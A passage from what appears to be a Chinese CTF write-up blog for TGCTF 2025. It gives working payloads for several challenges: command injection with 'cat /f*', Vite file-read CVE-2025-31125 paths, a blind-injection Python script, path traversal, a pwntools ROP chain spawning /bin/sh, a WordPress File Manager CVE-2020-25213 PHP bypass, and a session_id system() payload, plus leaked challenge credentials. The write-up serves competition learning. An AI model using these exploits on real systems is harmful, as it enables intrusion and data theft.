qQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt&quot;
Content-Type: application&#x2F;octet-stream

111

------WebKitFormBoundaryurqPJUpE3whNwI5B--
POST &#x2F;class.php?filename&#x3D;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32439
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Content-Type: application&#x2F;x-www-form-urlencoded
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 11

wow&#x3D;cat &#x2F;f*</code></pre>

<h3 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h3><p>紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。</p>
<p>这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&amp;raw??即可</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32360&#x2F;@fs&#x2F;tgflagggg?import&amp;raw??</code></pre>

<h3 id="前端GAME-plus"><a href="#前端GAME-plus" class="headerlink" title="前端GAME plus"></a>前端GAME plus</h3><p>参考<a href="https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC">https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC</a></p>
<pre class="language-none"><code class="language-none">&#x2F;@fs&#x2F;tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></pre>

<h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a>火眼辩魑魅</h3><p>robots.txt 直接打 tgshell.php</p>
<p>无过滤，直接POST传cat &#x2F;f*一把梭了</p>
<h3 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h3><p>狠狠非预期！！！</p>
<p>直接打盲注好吧。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
url <span class="token operator">=</span> <span class="token string">"http://node1.tgctf.woooo.tech:30215"</span>
flag <span class="token operator">=</span> <span class="token string">"TGCTF&#123;028b2d11-2783-464c-8cea-fda040"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># for s in 'TGCTF&#123;':</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token operator">+</span><span class="token string">'&#123;'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"expr"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">],'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">'));1/a"</span></span><span class="token punctuation">&#125;</span>
        <span class="token comment"># res = requests.post(url, data=json)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text, s)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text <span class="token operator">!=</span> <span class="token string">"A server error occurred.  Please contact the administrator."</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre>

<p>只要flag逐位是对的上的就会触发1&#x2F;0进而报错。否则就是1&#x2F;1正常。布尔盲注打完了。</p>
<h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h3><p>&#x2F;hints发现有路由。爆破。打到&#x2F;aazz。可以传参。那就arjun扫。发现filename参数。</p>
<p>路径穿越出。</p>
<p><a href="http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag">http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag</a></p>
<h3 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a>TG_wordpress</h3><p>&#x2F;robots.txt进去。看到&#x2F;.tmp&#x2F;vuln和&#x2F;.tmp&#x2F;.bak。.bak发现服务器在52013开了vuln服务（nc可以连）</p>
<p>ret2syscall 直接ROPgadgets可以一把梭。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./gets"</span><span class="token punctuation">)</span>
<span class="token comment">#io=remote()</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

p <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">40</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000419484</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000044a5e5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000043d350</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000044a5e5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000047f2eb</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000043d350</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>打到账密。TG_wordpressor, aXx^oV@K&amp;cFoVatzQ*</p>
<p>进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。</p>
<p>配置文件有过滤。可以使用如下绕过：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sys'</span><span class="token operator">.</span><span class="token string single-quoted-string">'tem'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>

<p>打进去就有了。</p>
<h3 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h3><p>没有禁止session相关。</p>
<p>payload:</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?tgctf2025&#x3D;session_id();session_start();system(hex2bin(session_id())); HTTP&#x2F;1.1
Host: node2.tgctf.woooo.tech:32385
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Cookie: PHPSESSID&#x3D;636174202f662a
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
